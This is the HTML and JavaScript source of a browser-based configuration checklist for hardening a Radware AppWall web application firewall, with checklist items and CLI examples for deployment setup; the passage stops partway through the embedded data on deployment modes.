<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Radware AppWall WAF Configuration Checklist</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        radware: {
                            primary: '#0050B3',
                            secondary: '#0073E6',
                            accent: '#00A9FF',
                            light: '#D6E8FF',
                            dark: '#003366'
                        },
                        status: {
                            critical: '#DC2626',
                            high: '#F97316',
                            medium: '#FBBF24',
                            low: '#10B981'
                        }
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
        }
        
        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #F1F5F9;
            border-radius: 9999px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #CBD5E1;
            border-radius: 9999px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #94A3B8;
        }
        
        /* Task Status Controls */
        .status-controls {
            display: inline-flex;
            background-color: #E2E8F0;
            border-radius: 9999px;
            padding: 2px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .status-btn {
            border: none;
            background: none;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.875rem;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            border-radius: 9999px;
            margin: 0 1px;
        }
        
        .status-btn.active {
            background-color: #0073E6;
            color: white;
            transform: scale(1.05);
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        
        .status-btn.na.active {
            background-color: #64748B;
        }
        
        /* Progress Animation */
        @keyframes progressFill {
            from { width: 0; }
        }
        
        .progress-value {
            animation: progressFill 1.5s ease-out forwards;
        }
        
        /* Fade-in Animation */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .animate-fade-in {
            animation: fadeIn 0.3s ease-out forwards;
        }

        .code-block {
            background-color: #1e293b;
            color: #f8fafc;
            border-radius: 0.5rem;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Consolas', 'Monaco', 'Andale Mono', monospace;
            font-size: 0.875rem;
            line-height: 1.5;
            margin: 1rem 0;
        }
        .code-comment {
            color: #94a3b8;
        }
        .code-command {
            color: #38bdf8;
        }
        .code-value {
            color: #4ade80;
        }
        .code-param {
            color: #fb923c;
        }
        .code-highlight {
            color: #fb7185;
            font-weight: 600;
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col">
    
    <!-- Header -->
    <header class="bg-gradient-to-r from-radware-dark to-radware-primary text-white shadow-lg sticky top-0 z-50">
        <div class="container mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex flex-col sm:flex-row justify-between items-center py-4 gap-4">
                <div class="flex items-center gap-4">
                    <div class="bg-white/15 rounded-xl w-14 h-14 flex items-center justify-center shadow-lg">
                        <i class="fas fa-shield-alt text-3xl"></i>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold m-0 leading-tight">Radware AppWall</h1>
                        <span class="text-sm opacity-85">WAF Configuration Checklist</span>
                    </div>
                </div>
                <div class="flex gap-3 flex-wrap justify-center">
                    <button id="btn-projects" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-folder"></i>
                        <span>Projects</span>
                    </button>
                    <button id="btn-dashboard" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-chart-line"></i>
                        <span>Dashboard</span>
                    </button>
                    <button id="btn-export" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-file-export"></i>
                        <span>Export</span>
                    </button>
                    <button id="btn-import" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-file-import"></i>
                        <span>Import</span>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-6 flex-1">
        <!-- Project Info Section -->
        <section class="bg-white rounded-2xl p-6 sm:p-8 shadow-xl border border-gray-100 mb-8">
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 pb-4 border-b border-gray-200">
                <h2 id="project-name" class="text-2xl font-bold bg-gradient-to-r from-radware-primary to-radware-secondary inline-block text-transparent bg-clip-text m-0">Radware AppWall Configuration</h2>
                <button id="btn-edit-project" class="btn bg-radware-secondary text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow mt-3 sm:mt-0">
                    <i class="fas fa-edit"></i>
                    <span>Edit Details</span>
                </button>
            </div>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-globe text-radware-accent"></i> Environment
                    </dt>
                    <dd id="project-target" class="text-gray-900 font-medium">production.example.com</dd>
                </div>
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-calendar-alt text-radware-accent"></i> Start Date
                    </dt>
                    <dd id="project-date" class="text-gray-900 font-medium">5/15/2025</dd>
                </div>
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-user-shield text-radware-accent"></i> Security Engineer
                    </dt>
                    <dd id="project-tester" class="text-gray-900 font-medium">WAF Administrator</dd>
                </div>
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-history text-radware-accent"></i> Last Updated
                    </dt>
                    <dd id="project-updated" class="text-gray-900 font-medium">5/18/2025</dd>
                </div>
                <div class="project-detail-item col-span-1 md:col-span-2">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-bullseye text-radware-accent"></i> Protected Applications
                    </dt>
                    <dd id="project-scope" class="text-gray-900 font-medium">E-commerce platform, Customer portal, Admin interface</dd>
                </div>
            </div>
        </section>

        <!-- Progress Section -->
        <section class="mb-12">
            <div class="flex items-end justify-between mb-6">
                <h2 class="text-2xl font-bold relative pb-3 inline-block">
                    Configuration Progress
                    <span class="absolute bottom-0 left-0 h-1 w-14 bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full"></span>
                </h2>
            </div>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-radware-primary w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-tasks text-white"></i>
                            </div>
                            Overall Progress
                        </h3>
                        <span id="overall-progress" class="text-xl font-bold text-radware-primary">18%</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="overall-progress-bar" class="h-full bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full progress-value" style="width: 18%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>Completed Tasks</span>
                        <span>Overall Completion</span>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-status-critical w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-exclamation-triangle text-white"></i>
                            </div>
                            Critical Items
                        </h3>
                        <span id="critical-progress" class="text-xl font-bold text-status-critical">9/64</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="critical-progress-bar" class="h-full bg-gradient-to-r from-status-critical to-red-400 rounded-full progress-value" style="width: 14%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>Critical Security Settings</span>
                        <span>High Priority</span>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-status-high w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-arrow-circle-up text-white"></i>
                            </div>
                            High Priority
                        </h3>
                        <span id="high-progress" class="text-xl font-bold text-status-high">12/78</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="high-progress-bar" class="h-full bg-gradient-to-r from-status-high to-amber-400 rounded-full progress-value" style="width: 15%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>High-Risk Vulnerabilities</span>
                        <span>Important Settings</span>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-status-medium w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-arrow-circle-right text-gray-800"></i>
                            </div>
                            Medium Priority
                        </h3>
                        <span id="medium-progress" class="text-xl font-bold text-status-medium">15/38</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="medium-progress-bar" class="h-full bg-gradient-to-r from-status-medium to-yellow-200 rounded-full progress-value" style="width: 39%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>Standard Configuration</span>
                        <span>Medium Risk</span>
                    </div>
                </div>
            </div>
        </section>

        <!-- Categories Section -->
        <section id="categories-section" class="mb-12">
            <div class="flex items-end justify-between mb-6">
                <h2 class="text-2xl font-bold relative pb-3 inline-block">
                    WAF Configuration Categories
                    <span class="absolute bottom-0 left-0 h-1 w-14 bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full"></span>
                </h2>
            </div>
            <div id="categories-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                <!-- Categories will be dynamically inserted here -->
            </div>
        </section>

        <!-- Category Details Section (Hidden by default) -->
        <section id="category-details" class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden mb-8 hidden">
            <div class="bg-gradient-to-r from-radware-dark to-radware-primary p-8 text-white relative overflow-hidden">
                <a href="#" id="btn-back" class="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-white/15 backdrop-blur transition hover:bg-white/25 mb-5 text-sm font-medium">
                    <i class="fas fa-arrow-left"></i>
                    <span>Back to categories</span>
                </a>
                <h2 id="details-title" class="text-3xl font-bold mb-2 text-white">1. Initial Deployment & Architecture</h2>
                <p id="details-subtitle" class="text-white/90 text-lg max-w-4xl">Base configuration setup, deployment modes, and network architecture</p>
            </div>
            <div class="p-8">
                <div class="border-b border-gray-200 flex gap-2 mb-8 overflow-x-auto">
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative active" data-tab="checklist">Checklist</a>
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative" data-tab="techniques">Techniques</a>
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative" data-tab="tools">Tools</a>
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative" data-tab="notes">Notes</a>
                </div>
                
                <div id="tab-contents">
                    <div id="checklist-tab" class="tab-content">
                        <!-- Checklist items will be dynamically inserted here -->
                    </div>
                    
                    <div id="techniques-tab" class="tab-content hidden">
                        <!-- Techniques will be dynamically inserted here -->
                    </div>
                    
                    <div id="tools-tab" class="tab-content hidden">
                        <!-- Tools will be dynamically inserted here -->
                    </div>
                    
                    <div id="notes-tab" class="tab-content hidden">
                        <div class="mb-6">
                            <label for="category-notes" class="block text-gray-700 font-medium mb-3">Configuration Notes for this Category</label>
                            <textarea id="category-notes" class="w-full min-h-[260px] p-4 border border-gray-300 rounded-lg resize-y font-sans text-gray-700 focus:outline-none focus:ring-2 focus:ring-radware-accent focus:border-transparent transition" placeholder="Add specific findings, observations, or commands used..."></textarea>
                            <button id="btn-save-notes" class="mt-5 bg-gradient-to-r from-radware-primary to-radware-secondary text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md hover:shadow-lg transition">
                                <i class="fas fa-save"></i>
                                <span>Save Notes</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Findings Section -->
        <section class="mb-12">
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
                <h2 class="text-2xl font-bold relative pb-3 inline-block">
                    Configuration Issues
                    <span class="absolute bottom-0 left-0 h-1 w-14 bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full"></span>
                </h2>
                <div class="flex gap-3">
                    <button id="btn-add-finding" class="bg-status-low hover:bg-green-600 text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md hover:shadow-lg transition">
                        <i class="fas fa-plus"></i>
                        <span>Add Issue</span>
                    </button>
                    <button id="btn-generate-report" class="bg-radware-primary hover:bg-radware-secondary text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md hover:shadow-lg transition">
                        <i class="fas fa-file-alt"></i>
                        <span>Generate Report</span>
                    </button>
                </div>
            </div>
            <div class="bg-white rounded-xl shadow-xl border border-gray-100 overflow-hidden">
                <div class="overflow-x-auto">
                    <table class="w-full text-left">
                        <thead>
                            <tr>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent">Category</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">High</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Medium</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Low</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Info</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Total</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="findings-table-body">
                            <!-- Finding data will be dynamically inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>
        </section>
    </main>

    <!-- Footer -->
    <footer class="bg-gradient-to-r from-radware-dark to-radware-primary text-white py-12 mt-6">
        <div class="container mx-auto px-4 sm:px-6 lg:px-8">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                <div>
                    <h3 class="text-xl font-bold mb-4 relative inline-block pb-3">
                        Radware AppWall Configuration Checklist
                        <span class="absolute bottom-0 left-0 w-10 h-1 bg-radware-accent"></span>
                    </h3>
                    <p class="text-white/90 text-sm">A comprehensive framework for configuring and validating Radware AppWall WAF deployments based on industry best practices and Radware's recommendations.</p>
                </div>
                <div>
                    <h4 class="text-lg font-bold mb-4 relative inline-block pb-2">
                        Resources
                        <span class="absolute bottom-0 left-0 w-8 h-1 bg-radware-accent"></span>
                    </h4>
                    <ul class="space-y-3">
                        <li><a href="https://www.radware.com/products/appwall/" target="_blank" class="text-white/90 hover:text-white flex items-center gap-2 pl-4 relative text-sm before:content-[''] before:absolute before:left-0 before:top-1/2 before:-translate-y-1/2 before:w-2 before:h-2 before:bg-radware-accent before:rounded-full hover:translate-x-1 transition-transform"><i class="fas fa-external-link-alt opacity-80"></i> Radware AppWall Documentation</a></li>
                        <li><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" class="text-white/90 hover:text-white flex items-center gap-2 pl-4 relative text-sm before:content-[''] before:absolute before:left-0 before:top-1/2 before:-translate-y-1/2 before:w-2 before:h-2 before:bg-radware-accent before:rounded-full hover:translate-x-1 transition-transform"><i class="fas fa-external-link-alt opacity-80"></i> OWASP Top 10</a></li>
                        <li><a href="https://www.pci-dss.org" target="_blank" class="text-white/90 hover:text-white flex items-center gap-2 pl-4 relative text-sm before:content-[''] before:absolute before:left-0 before:top-1/2 before:-translate-y-1/2 before:w-2 before:h-2 before:bg-radware-accent before:rounded-full hover:translate-x-1 transition-transform"><i class="fas fa-external-link-alt opacity-80"></i> PCI DSS Requirements</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-lg font-bold mb-4 relative inline-block pb-2">
                        About This Tool
                        <span class="absolute bottom-0 left-0 w-8 h-1 bg-radware-accent"></span>
                    </h4>
                    <p class="text-white/90 text-sm mb-3">Data is saved locally in your browser via LocalStorage. No data is sent externally. Use Export/Import for backup or transfer between devices.</p>
                    <p class="text-white/90 text-sm">This tool is developed for professional WAF configuration and should be used by security teams with Radware AppWall experience.</p>
                </div>
            </div>
            <div class="border-t border-white/10 mt-8 pt-8 text-center text-sm text-white/70">
                <p>© 2025 Radware AppWall WAF Configuration Checklist | For professional security configuration only</p>
            </div>
        </div>
    </footer>

    <!-- Modals -->
    <!-- Finding Modal -->
    <div id="finding-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-lg w-full max-h-[90vh] overflow-y-auto">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                <h3 id="finding-modal-title" class="text-xl font-semibold text-gray-900">Add Configuration Issue</h3>
                <button class="modal-close text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="space-y-4">
                    <div>
                        <label for="finding-category" class="block text-sm font-medium text-gray-700 mb-1">Category</label>
                        <select id="finding-category" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <!-- Options will be dynamically inserted here -->
                        </select>
                    </div>
                    
                    <div>
                        <label for="finding-title" class="block text-sm font-medium text-gray-700 mb-1">Issue Title</label>
                        <input type="text" id="finding-title" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition" placeholder="Brief description of the issue">
                    </div>
                    
                    <div>
                        <label for="finding-severity" class="block text-sm font-medium text-gray-700 mb-1">Severity</label>
                        <select id="finding-severity" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="high">High</option>
                            <option value="medium">Medium</option>
                            <option value="low">Low</option>
                            <option value="info">Informational</option>
                        </select>
                    </div>
                    
                    <div>
                        <label for="finding-description" class="block text-sm font-medium text-gray-700 mb-1">Description</label>
                        <textarea id="finding-description" rows="4" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition" placeholder="Detailed description of the issue"></textarea>
                    </div>
                    
                    <div>
                        <label for="finding-remediation" class="block text-sm font-medium text-gray-700 mb-1">Recommended Remediation</label>
                        <textarea id="finding-remediation" rows="4" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition" placeholder="Steps to remediate the issue"></textarea>
                    </div>
                    
                    <div>
                        <label for="finding-config" class="block text-sm font-medium text-gray-700 mb-1">Configuration Commands</label>
                        <textarea id="finding-config" rows="4" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition font-mono text-sm" placeholder="AppWall configuration commands to address the issue"></textarea>
                    </div>
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-end gap-3">
                <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">Cancel</button>
                <button id="btn-save-finding" class="px-4 py-2 bg-gradient-to-r from-radware-primary to-radware-secondary text-white rounded-lg hover:shadow-md transition">Save Issue</button>
            </div>
        </div>
    </div>
    
    <!-- View Finding Modal -->
    <div id="view-finding-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                <h3 id="view-finding-title" class="text-xl font-semibold text-gray-900">Configuration Issue Details</h3>
                <button class="modal-close text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="space-y-6" id="view-finding-content">
                    <!-- Finding content will be inserted here dynamically -->
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-between gap-3">
                <div>
                    <button id="btn-edit-finding" class="px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition flex items-center gap-2">
                        <i class="fas fa-edit"></i> Edit
                    </button>
                </div>
                <div class="flex gap-3">
                    <button id="btn-delete-finding" class="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition flex items-center gap-2">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                    <button class="modal-close px-4 py-2 bg-gray-700 text-white rounded-lg hover:bg-gray-800 transition">Close</button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Confirm Delete Modal -->
    <div id="confirm-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-md w-full">
            <div class="border-b border-gray-200 px-6 py-4">
                <h3 class="text-xl font-semibold text-gray-900">Confirm Action</h3>
            </div>
            <div class="p-6">
                <p id="confirm-message" class="text-gray-700">Are you sure you want to delete this configuration issue? This action cannot be undone.</p>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-end gap-3">
                <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">Cancel</button>
                <button id="confirm-yes" class="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition">Yes, Delete</button>
            </div>
        </div>
    </div>

    <!-- Export Report Modal -->
    <div id="export-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-lg w-full">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                <h3 class="text-xl font-semibold text-gray-900">Export Report</h3>
                <button class="modal-close text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="space-y-4">
                    <div>
                        <label for="export-format" class="block text-sm font-medium text-gray-700 mb-1">Report Format</label>
                        <select id="export-format" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="pdf">PDF Document</option>
                            <option value="html">HTML Report</option>
                            <option value="json">JSON Configuration</option>
                        </select>
                    </div>
                    
                    <div>
                        <label for="export-detail" class="block text-sm font-medium text-gray-700 mb-1">Detail Level</label>
                        <select id="export-detail" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="summary">Summary (Issues Only)</option>
                            <option value="detailed">Detailed (Full Configuration Status)</option>
                            <option value="complete">Complete (All Settings and Commands)</option>
                        </select>
                    </div>
                    
                    <div class="flex items-start gap-2">
                        <input type="checkbox" id="export-include-notes" class="mt-1">
                        <label for="export-include-notes" class="text-sm text-gray-700">Include configuration notes in the report</label>
                    </div>
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-end gap-3">
                <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">Cancel</button>
                <button id="btn-do-export" class="px-4 py-2 bg-gradient-to-r from-radware-primary to-radware-secondary text-white rounded-lg hover:shadow-md transition">Export Report</button>
            </div>
        </div>
    </div>

    <!-- Toast Notifications -->
    <div id="toast-container" class="fixed bottom-4 right-4 z-50"></div>

    <script>
      // --- Constants and Configuration ---
const STORAGE_KEY = 'radware-appwall-projects-v1';
const TASK_STATUS = {
    NOT_TESTED: 'not-tested',
    PASSED: 'passed',
    NA: 'na'
};

// --- Global State Management ---
let currentCategory = '';
let currentProject = null;
let projects = {};
let confirmCallback = null;
let currentEditingFindingId = null;
let filterActive = false;
let searchQuery = '';

// --- Comprehensive Radware AppWall WAF Data Structure ---
const appwallData = {
    categories: [
        {
            id: 'deployment',
            title: '1. Initial Deployment & Architecture',
            subtitle: 'Base configuration setup, deployment modes, and network architecture',
            icon: 'fa-server',
            priority: 'critical',
            progress: 12,
            checklist: [
                {
                    title: '1.1 Deployment Mode Configuration',
                    icon: 'fa-network-wired',
                    items: [
                        { id: '1.1.1', text: 'Select appropriate deployment mode (Transparent Bridge, Reverse Proxy, or Out-of-Path)', priority: 'critical' },
                        { id: '1.1.2', text: 'Configure network interfaces with appropriate IP and VLAN settings', priority: 'critical' },
                        { id: '1.1.3', text: 'Set default gateway and DNS server configurations', priority: 'high' },
                        { id: '1.1.4', text: 'Configure SSL/TLS for encrypted AppWall management', priority: 'critical' },
                        { id: '1.1.5', text: 'Implement access control lists for AppWall management interfaces', priority: 'critical' },
                        { id: '1.1.6', text: 'Verify connectivity with upstream and downstream network components', priority: 'high' },
                        { id: '1.1.7', text: 'Configure management network access restrictions', priority: 'critical' },
                        { id: '1.1.8', text: 'Set up traffic bypass rules for maintenance access', priority: 'medium' }
                    ]
                },
                {
                    title: '1.2 Initial Security Policy',
                    icon: 'fa-shield-alt',
                    items: [
                        { id: '1.2.1', text: 'Create base security policy with descriptive name', priority: 'high' },
                        { id: '1.2.2', text: 'Configure initial policy in passive/learning mode', priority: 'critical' },
                        { id: '1.2.3', text: 'Set default security policy actions (alert, block, learning)', priority: 'critical' },
                        { id: '1.2.4', text: 'Configure initial whitelists for trusted sources', priority: 'high' },
                        { id: '1.2.5', text: 'Define custom block pages with appropriate branding', priority: 'medium' },
                        { id: '1.2.6', text: 'Set up default signature policy protections', priority: 'critical' },
                        { id: '1.2.7', text: 'Configure base HTTP protocol compliance checks', priority: 'high' },
                        { id: '1.2.8', text: 'Enable passive learning phase for trusted traffic', priority: 'critical' }
                    ]
                },
                {
                    title: '1.3 System Configuration',
                    icon: 'fa-cogs',
                    items: [
                        { id: '1.3.1', text: 'Secure default AppWall administrative accounts', priority: 'critical' },
                        { id: '1.3.2', text: 'Create RBAC user accounts with appropriate permissions', priority: 'high' },
                        { id: '1.3.3', text: 'Configure NTP for accurate time synchronization', priority: 'medium' },
                        { id: '1.3.4', text: 'Set up remote syslog server for log collection', priority: 'high' },
                        { id: '1.3.5', text: 'Configure email alerts for critical events', priority: 'high' },
                        { id: '1.3.6', text: 'Enable and schedule automated backups of configuration', priority: 'critical' },
                        { id: '1.3.7', text: 'Set up SNMP monitoring for infrastructure integration', priority: 'medium' },
                        { id: '1.3.8', text: 'Configure resource utilization alerts and thresholds', priority: 'high' },
                        { id: '1.3.9', text: 'Implement certificate management for SSL/TLS', priority: 'critical' },
                        { id: '1.3.10', text: 'Set up emergency access credentials in secure storage', priority: 'high' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Deployment Mode Selection Guidelines',
                    content: `
                        <p class="mb-4 text-gray-700">Selecting the appropriate deployment mode is critical for AppWall's effectiveness and minimal impact on network architecture.</p>
                        
                        <h5 class="font-semibold mb-2 text-gray-800">Transparent Bridge Mode</h5>
                        <p class="mb-4 text-gray-700">Best for initial deployments and when minimal network changes are required. AppWall acts as a layer 2 bridge between network segments.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure Transparent Bridge Mode</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> operation-mode</div>
                            <div><span class="code-highlight">operation-mode transparent-bridge</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">interface</span> eth1</div>
                            <div><span class="code-param">description</span> <span class="code-value">"External Interface"</span></div>
                            <div><span class="code-param">mtu</span> <span class="code-value">1500</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">interface</span> eth2</div>
                            <div><span class="code-param">description</span> <span class="code-value">"Internal Interface"</span></div>
                            <div><span class="code-param">mtu</span> <span class="code-value">1500</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">bridge</span> br0</div>
                            <div><span class="code-param">ports</span> <span class="code-value">eth1 eth2</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Reverse Proxy Mode</h5>
